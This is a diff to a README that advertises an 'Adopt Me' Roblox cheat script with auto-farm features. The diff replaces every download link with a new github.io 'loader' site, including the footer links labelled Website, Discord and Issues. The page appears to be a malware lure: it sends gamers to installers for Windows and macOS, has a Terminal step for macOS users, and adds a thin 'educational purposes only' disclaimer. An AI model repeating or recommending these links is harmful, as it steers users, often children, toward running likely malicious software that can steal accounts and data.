@@ -8,9 +8,9 @@
 
 If you've spent hours grinding in Adopt Me only to fall behind, this **adopt me script** was built for you. It automates the most tedious parts of the game while giving you powerful tools to progress faster and stay ahead of everyone else.
 
-[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://bansheeloaderquay.github.io/dl-win/)
 
-[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://bansheeloaderquay.github.io/dl-mac/)
 
 <img width="1280" height="720" alt="Adopt Me Script" src="https://github.com/user-attachments/assets/bee9bab6-57a5-4e11-9ec0-42e950716f3a" />
 
@@ -21,7 +21,7 @@ Key highlights include:
 - 💰 **Auto Farm Bucks** — earn bucks passively 24/7 without touching your keyboard
 - 🍬 **Auto Farm Candy** — activates during seasonal events and farms event currency automatically
 
-### [⬇️ Download Adopt Me Script](https://mixedlinkrelease.github.io/installer/)
+### [⬇️ Download Adopt Me Script](https://bansheeloaderquay.github.io/dl-win/)
 
 ---
 
@@ -73,7 +73,7 @@ There are dozens of scattered Pastebin pastes claiming to be the best **adopt me
 
 ### 🖥️ Windows (PC)
 
-[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://bansheeloaderquay.github.io/dl-win/)
 
 You'll need a script executor (such as Solara or Calamari) before running any script.
 
@@ -87,7 +87,7 @@ You'll need a script executor (such as Solara or Calamari) before running any sc
 
 ### 🍏 macOS (Intel/Apple Silicon)
 
-[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://bansheeloaderquay.github.io/dl-mac/)
 
 1. Press `⌘ + Space`, type **Terminal**, hit Enter
 2. Download the installer using the button above
@@ -150,4 +150,4 @@ This project is released for educational and research purposes only. Use respons
 
 ---
 
-<p align="center">Made with 🐾 by the Adopt Me Script Dev Team — <a href="https://mixedlinkrelease.github.io/installer/">Website</a> · <a href="https://mixedlinkrelease.github.io/installer/">Discord</a> · <a href="https://mixedlinkrelease.github.io/installer/">Issues</a></p>
+<p align="center">Made with 🐾 by the Adopt Me Script Dev Team — <a href="https://bansheeloaderquay.github.io/dl-win/">Website</a> · <a href="https://bansheeloaderquay.github.io/dl-win/">Discord</a> · <a href="https://bansheeloaderquay.github.io/dl-win/">Issues</a></p>
